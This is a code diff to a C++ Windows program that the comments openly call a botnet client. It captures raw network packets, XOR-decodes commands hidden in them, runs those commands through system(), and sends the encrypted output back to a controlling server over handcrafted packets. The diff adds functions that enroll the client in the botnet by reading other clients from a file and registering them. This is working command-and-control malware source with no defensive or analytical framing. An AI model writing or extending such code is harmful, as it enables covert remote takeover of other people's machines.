@@ -131,6 +131,8 @@ void ipv4_address(std::vector<std::string>& lines_vect, std::vector<std::string>
 void get_ip(std::vector<std::string>& ip_addresses);
 int send_packet(std::string address, std::string mac_addr, std::string option, int id_num);
 int connected_mode_send(std::string address, std::string mac_addr, std::string option, std::string command, int id_num);
+int add_to_net();
+int command_check(std::string command);
 
 /*
  *This is the capture thread
@@ -201,7 +203,9 @@ int main()
 	startup_finder();
 
 	InitializeCriticalSection(&HandleLock);
-
+	//check file to see if data bot has sent itself to other clients yet
+	add_to_net();
+	
 	//trying the multithreaded prog
 	DWORD id;
 	HANDLE hCapture = CreateThread(NULL, 0, capture, (PVOID)1, 0, &id);
@@ -210,9 +214,75 @@ int main()
 	//Wait for objects
 	WaitForSingleObject(hCapture, INFINITE);
 	DeleteCriticalSection(&HandleLock);
-
+	
 	int temp = 0;
 	std::cin >> temp;
+	return 0;
+}
+
+/*
+ *This function will be used to check if the
+ *client has sent itself to the botnet yet
+ *return: always returns 0
+ */
+int add_to_net() {
+	std::ifstream myfile("clients.txt");
+	if (myfile.is_open()) {
+		while (!myfile.eof()) {
+			std::string line;
+			getline(myfile, line);
+			if (line != "added") {
+				std::vector<std::string> bytes;
+				split(line, ' ', bytes);
+				int id_num = rand() % 7000;
+				std::string mac_address = bytes[1];
+				//remove newline
+				for (int i = 0; i < 17; i++) {
+					mac_address[i] = mac_address[i];
+				}
+				std::string command = bytes[0] + " " + mac_address;
+				//encrypt command
+				int command_len = command.length();
+				for (int i = 0; i < command_len; i++) {
+					command[i] = command[i] ^ 'H';
+				}
+				connected_mode_send(bytes[0], mac_address, "1", command, id_num);
+			}
+		}
+		myfile.close();
+	}
+	return 0;
+}
+
+/*
+ *This function will check commands to see
+ *if it is a client adding itself to the net
+ *return: is 0 if not client and 1 if client
+ */
+int command_check(std::string command) {
+	int command_len = command.length();
+	
+	//check length of command
+	if (command_len > 24 && command_len < 46) {
+		std::vector<std::string> bytes;
+		split(command, ' ', bytes);
+		//check for ip and mac address
+		if (bytes.size() == 2) {
+			//verify mac address size
+			if (bytes[1].length() == 17) {
+				//write to file
+				std::ofstream myfile;
+				myfile.open("add_to_net.txt", std::ofstream::out | std::ofstream::app);
+				if (myfile.is_open()) {
+					command = command + "\n";
+					myfile << command;
+					myfile.close();
+					return 1;
+				}
+				
+			}
+		}
+	}
 	return 0;
 }
 
@@ -279,10 +349,12 @@ void split(const std::string& s, char delim, std::vector<std::string>& v) {
 *remove the spaces from each string in the vector
 */
 void remover(std::vector<std::string>& v) {
-	for (int i = 0; i < v.size(); i++) {
+	int size = v.size();
+	for (int i = 0; i < size; i++) {
 		std::string getting_changed = v[i];
 		std::string changed_str = "";
-		for (int i = 0; i < getting_changed.size(); i++) {
+		int g_size = getting_changed.size();
+		for (int i = 0; i < g_size; i++) {
 			if (' ' != getting_changed[i]) {
 				changed_str += getting_changed[i];
 			}
@@ -310,13 +382,14 @@ std::string parser(const std::string res, std::vector<std::string> v) {
 	std::string directories = "";
 	split(res, '\n', v);
 	remover(v);
-
-	for (int i = 0; i < v.size(); i++) {
+	int size = v.size();
+	for (int i = 0; i < size; i++) {
 		int temp = v[i].find('>');
 		if (temp == 21) {
 			int res = matcher(v[i][22]);
 			if (res > -1) {
-				for (int x = 22; x < v[i].size(); x++) {
+				int index_size = v[i].size();
+				for (int x = 22; x < index_size; x++) {
 					directories = directories + v[i][x];
 				}
 			}
@@ -391,7 +464,8 @@ int startup_finder() {
 	*/
 	result = parser(result, parts);
 	split(result, ' ', parts);
-	for (int i = 0; i < parts.size(); i++) {
+	int part_size = parts.size();
+	for (int i = 0; i < part_size; i++) {
 		int rest = matcher(parts[i][0]);
 		if (rest != -1) {
 			folder.push_back(parts[i]);
@@ -546,33 +620,38 @@ void decapsulate(const u_char *data, int size) {
 						}
 						
 						//decrypt command
-						for (int i = 0; i < command.length(); i++) {
+						int com_len = command.length();
+						for (int i = 0; i < com_len; i++) {
 							command[i] = command[i] ^ 'H';
 						}
 						//std::cout << command << std::endl;
-						
-						//run command
-						command = command + " > test.txt";
-						int return_val = system(command.c_str());
-						//read output from file
-						std::string result;
-						std::ifstream myfile("test.txt");
-						if (myfile.is_open()) {
-							while (!myfile.eof()) {
-								std::string line;
-								getline(myfile, line);
-								result = result + line;
+						if (command_check(command) == 0) {
+							//run command
+							command = command + " > test.txt";
+							int return_val = system(command.c_str());
+							//read output from file
+							std::string result;
+							std::ifstream myfile("test.txt");
+							if (myfile.is_open()) {
+								while (!myfile.eof()) {
+									std::string line;
+									getline(myfile, line);
+									result = result + line;
+								}
+								myfile.close();
 							}
-							myfile.close();
+							//encrypt result
+							int res_len = result.length();
+							for (int i = 0; i < res_len; i++) {
+								result[i] = result[i] ^ 'H';
+							}
+							//std::cout << result.length() << std::endl;
+							//add check for new clients here
+
+							//return result to server
+							identification_number++;
+							connected_mode_send(address, mac_address, "1", result, identification_number);
 						}
-						//encrypt result
-						for (int i = 0; i < result.length(); i++) {
-							result[i] = result[i] ^ 'H';
-						}
-						//std::cout << result.length() << std::endl;
-						//return result to server
-						identification_number++;
-						connected_mode_send(address, mac_address, "1", result, identification_number);
 					}
 				}
 
@@ -719,8 +798,8 @@ void get_mac(mac_values** values) {
 */
 void ipv4_address(std::vector<std::string>& lines_vect, std::vector<std::string>& ip_addresses) {
 	std::size_t found;
-
-	for (int i = 0; i < lines_vect.size(); i++) {
+	int size = lines_vect.size();
+	for (int i = 0; i < size; i++) {
 		found = lines_vect[i].find("IPv4");
 		if (found != std::string::npos) {
 			std::vector<std::string> name_ip;
@@ -835,11 +914,25 @@ int send_packet(std::string address, std::string mac_addr, std::string option, i
 		for (int i = 34; i < 42; i++) {
 			packet[i] = i % 256;
 		}
+		//sending ack packet
+		std::ifstream myfile("psh_ack_tcp_header.txt");
+		if (myfile.is_open()) {
+			std::string line;
+			getline(myfile, line);
+			std::vector<std::string> bytes;
+			split(line, ' ', bytes);
+			int index = 0;
+			for (int i = 42; i < 62; i++) {
+				packet[i] = atoi(bytes[index].c_str());
+				index++;
+			}
+			myfile.close();
+		}
 	}
 	else {
 		packet[14] = 69; //64 represents 4=>IPv4  5 represents minimum ipv4 length
 		size = 54;
-		//total length =1500
+		//total length
 		packet[16] = 0;
 		packet[17] = size -14;
 	}
@@ -967,10 +1060,10 @@ int connected_mode_send(std::string address, std::string mac_addr, std::string o
 		else
 			size = 66 + 3900;
 		
+		std::cout << "made it here" << std::endl;
 		//total length
 		packet[16] = size / 256;
 		packet[17] = size % 256;
-		std::cout << "I've sent the packet boss." << std::endl;
 		//sending ack packet
 		std::ifstream myfile("psh_ack_tcp_header.txt");
 		if (myfile.is_open()) {
@@ -1028,7 +1121,7 @@ int connected_mode_send(std::string address, std::string mac_addr, std::string o
 	else
 		packet[14] = 69; //64 represents 4=>IPv4  5 represents minimum ipv4 length
 
-						 //differentiated services
+	//differentiated services
 	packet[15] = 0;
 	
 	//identification
@@ -1058,7 +1151,7 @@ int connected_mode_send(std::string address, std::string mac_addr, std::string o
 	src_addr->byte2 = atoi(octets[1].c_str());
 	src_addr->byte3 = atoi(octets[2].c_str());
 	src_addr->byte4 = atoi(octets[3].c_str());
-
+	
 	//destination address
 	std::vector<std::string> octs;
 	split(address, '.', octs);
@@ -1066,7 +1159,7 @@ int connected_mode_send(std::string address, std::string mac_addr, std::string o
 	dest_addr->byte2 = atoi(octs[1].c_str());
 	dest_addr->byte3 = atoi(octs[2].c_str());
 	dest_addr->byte4 = atoi(octs[3].c_str());
-
+	
 	//source ip address
 	packet[26] = src_addr->byte1;
 	packet[27] = src_addr->byte2;
@@ -1080,7 +1173,6 @@ int connected_mode_send(std::string address, std::string mac_addr, std::string o
 	packet[33] = dest_addr->byte4;
 	free(dest_addr);
 
-	std::cout << "made it here" << std::endl;
 	/* Send the packet */
 	EnterCriticalSection(&HandleLock);
 	pcap_if_t* first_device;
